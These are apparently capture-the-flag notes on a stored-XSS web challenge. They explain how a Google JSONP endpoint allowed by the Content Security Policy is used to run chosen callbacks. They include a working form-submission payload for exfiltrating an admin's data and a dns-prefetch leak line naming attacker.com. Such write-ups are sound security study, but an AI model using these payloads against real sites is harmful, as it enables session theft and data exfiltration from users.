# Web XSS + Google JSONP CSP Bypass (Rookery / Massagold)

## App Structure
- Express.js + EJS templating
- SQLite database with users + messages tables
- Bot visits messages as admin (Playwright Firefox)
- Stored XSS via `<%- message.content %>` in `message.ejs`

## CSP
```
default-src 'self'
script-src 'self' https://www.googleapis.com
style-src 'self'
img-src 'self' data:
font-src 'self' data:
connect-src 'self'
object-src 'none'
form-action 'self'
frame-ancestors 'none'
```

## Google JSONP Bypass
Endpoint: `https://www.googleapis.com/discovery/v1/apis?callback=functionName`
Response format: `// API callback\nfunctionName({...})`

### Working Callbacks
- `location.assign` — navigates to `[object Object]` (relative URL)
- `f.submit` — submits HTMLFormElement (argument ignored)
- `open` — `window.open("[object Object]")`
- `close` — `window.close()`
- `setTimeout` — `setTimeout({...})` → eval("[object Object]")
- `eval` — accepts dots in callback name

### Known Not Working
- Inline `<script>` tags (CSP blocks)
- `document.write` — writes `[object Object]` (clears page)
- `fetch` — `connect-src 'self'` blocks external
- `<img>` exfiltration — `img-src 'self' data:` blocks external
- `<form>` to external — `form-action 'self'` blocks

### Exfiltration Technique (form submission)
```html
<form id="f" action="/messages" method="POST">
  <input name="to_username" value="attacker_user">
  <input name="content" value="STOLEN_DATA">
</form>
<script src="https://www.googleapis.com/discovery/v1/apis?callback=f.submit"></script>
```

### Unblocked Channels
- Navigation: `<meta http-equiv="refresh">`, `location.assign/replace`
- DNS prefetch: `<link rel="dns-prefetch" href="//attacker.com">`
- Form submission to same origin (`form-action 'self'`)
